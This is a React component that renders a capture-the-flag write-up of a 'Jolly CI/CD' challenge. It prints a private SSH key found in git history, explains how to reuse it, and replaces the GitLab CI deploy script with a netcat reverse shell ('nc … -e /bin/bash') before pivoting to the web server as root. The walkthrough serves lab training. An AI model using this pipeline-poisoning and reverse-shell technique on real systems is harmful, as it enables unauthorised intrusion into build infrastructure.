import ChallengeSummary from "../ChallengeSummary";
import {Accordion, AccordionDetails} from "@mui/material";
import {ChallengeDetails, Content, ContentImage, IC, Pop, StyledSyntaxHighligher, TerminalPrompt} from "../Common";
import QuoteCard from "../QuoteCard";
import characters from "../characters";
import React from "react";

function JollyCICD() {
  return (
    <Accordion>
      <ChallengeSummary title={"Jolly CI/CD"} difficulty={5}/>
      <AccordionDetails>
        <ChallengeDetails>
          Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.
        </ChallengeDetails>
        <Content>
          Heading upstairs, we are greeted by <Pop>Rippin Proudboot</Pop> who has the following to say:
        </Content>
        <QuoteCard
          character={characters.rippin_proudboot}
          quote={0}
        />
        <Content>
          Logging into the nearby terminal, we get the following prompt:
        </Content>
        <TerminalPrompt>
          Greetings Noble Player,
          <br/><br/>
          Many thanks for answering our desperate cry for help!
          <br/><br/>
          You may have heard that some evil Sporcs have opened up a web-store selling
          counterfeit banners and flags of the many noble houses found in the land of
          the North! They have leveraged some dastardly technology to power their
          storefront, and this technology is known as PHP!
          <br/><br/>
          ***gasp***
          <br/><br/>
          This strorefront utilizes a truly despicable amount of resources to keep the
          website up. And there is only a certain type of Christmas Magic capable of
          powering such a thing… an Elfen Ring!
          <br/><br/>
          Along with PHP there is something new we've not yet seen in our land.
          A technology called Continuous Integration and Continuous Deployment!
          <br/><br/>
          Be wary!
          <br/><br/>
          Many fair elves have suffered greatly but in doing so, they've managed to
          secure you a persistent connection on an internal network.
          <br/><br/>
          BTW take excellent notes!
          <br/><br/>
          Should you lose your connection or be discovered and evicted the
          elves can work to re-establish persistence. In fact, the sound off fans
          and the sag in lighting tells me all the systems are booting up again right now.
          <br/><br/>
          Please, for the sake of our Holiday help us recover the Ring and save Christmas!
        </TerminalPrompt>
        <Content>
          We can start by cloning the repository <Pop>Tinsel Upatree</Pop> mentioned after completing the previous
          challenge:
        </Content>
        <StyledSyntaxHighligher language={"sh"}>
          {
            `grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`
          }
        </StyledSyntaxHighligher>
        <Content>
          Let's take a quick look at the git history:
        </Content>
        <StyledSyntaxHighligher language={"sh"}>
          {
            `grinchum-land:~/wordpress.flag.net.internal$ git log
commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops`
          }
        </StyledSyntaxHighligher>
        <Content>
          It looks like there was an unintended commit. Let's investigate this more. We can checkout the commit just
          prior, and the first thing I notice is a private ssh key checked in named <IC>.deploy</IC>:
        </Content>
        <StyledSyntaxHighligher>
          {
            `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----`
          }
        </StyledSyntaxHighligher>
        <Content>
          We can use this ssh key to gain access to the remote git repository. We can see a <IC>.gitlab-ci.yml</IC> file
          in the repo, and the url seems to indicate that it's a gitlab instance, so we may be able to leverage the <Pop>CI/CD</Pop> pipeline
          here. First let's configure <Pop>ssh</Pop> so we can access the git repo.
        </Content>
        <Content>
          We will need to create an <Pop>ssh config</Pop>:
        </Content>
        <StyledSyntaxHighligher>
          {
            `Host gitlab.flag.net.internal
        User sporx
        Hostname gitlab.flag.net.internal
        PreferredAuthentications publickey
        IdentityFile /home/samways/.ssh/.deploy`
          }
        </StyledSyntaxHighligher>
        <Content>
          And we will need to add a remote to the repo that utilizes <Pop>ssh</Pop> instead of <Pop>https</Pop>:
        </Content>
        <StyledSyntaxHighligher language={"sh"}>
          {
            `git remote add ssh git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git`
          }
        </StyledSyntaxHighligher>
        <Content>
          Before we modify the pipeline for our own purposes, let's take a look at what it is doing now by
          inspecting <IC>.gitlab-ci.yml</IC>:
        </Content>
        <StyledSyntaxHighligher language={"yaml"}>
          {
            `stages:
  - deploy

deploy-job:      
  stage: deploy 
  environment: production
  script:
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html`
          }
        </StyledSyntaxHighligher>
        <Content>
          The pipeline is using <IC>rsync</IC> to ssh into the web server and deploy the web application. We can see
          that an identity
          file is referenced at <IC>/etc/gitlab-runner/hhc22-wordpress-deploy</IC>. Let's modify this to give us a
          reverse shell instead:
        </Content>
        <StyledSyntaxHighligher language={"yaml"}>
          {
            `stages:
  - deploy

deploy-job:      
  stage: deploy 
  environment: production
  script:
    - nc 172.18.0.99 10041 -e /bin/bash`
          }
        </StyledSyntaxHighligher>
        <Content>
          Note that <IC>172.18.0.99</IC> is our IP. Now we just need to open a netcat listener on port <IC>10041</IC>,
          commit and push the
          changes to the remote repository, and when the CI pipeline kicks off, we should catch a shell. Of note, the
          ssh key
          needs to have proper permissions to be used, so we need to ensure we run <IC>chmod 400
          ~/.ssh/.deploy</IC> first.
        </Content>
        <ContentImage src={"images/rev_shell.png"}/>
        <Content>
          As we can see above, we've successfully caught our shell, but we aren't where we want to be yet - we are
          inside the <Pop>Gitlab runner</Pop>. Recalling that the original pipeline was leveraging ssh to deploy the web app, we
          can simply do the same to escape the runner:
        </Content>
        <StyledSyntaxHighligher language={"yaml"}>
          {
            `ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal`
          }
        </StyledSyntaxHighligher>
        <Content>
          We are now on our target machine, and we can find the flag at <IC>/flag.txt</IC>:
        </Content>
        <ContentImage src={"images/jolly_win.png"}/>
        <Content>
          Here's what <Pop>Rippin Proudboot</Pop> has to say:
        </Content>
        <QuoteCard
          character={characters.rippin_proudboot}
          quote={1}
        />
        <Content>
          Once complete, we see <Pop>Grinchum</Pop> squatting once again in the corner. Here's what he has to say:
        </Content>
        <QuoteCard
          character={characters.grinchum}
          quote={1}
        />
      </AccordionDetails>
    </Accordion>
  )
}

export default JollyCICD
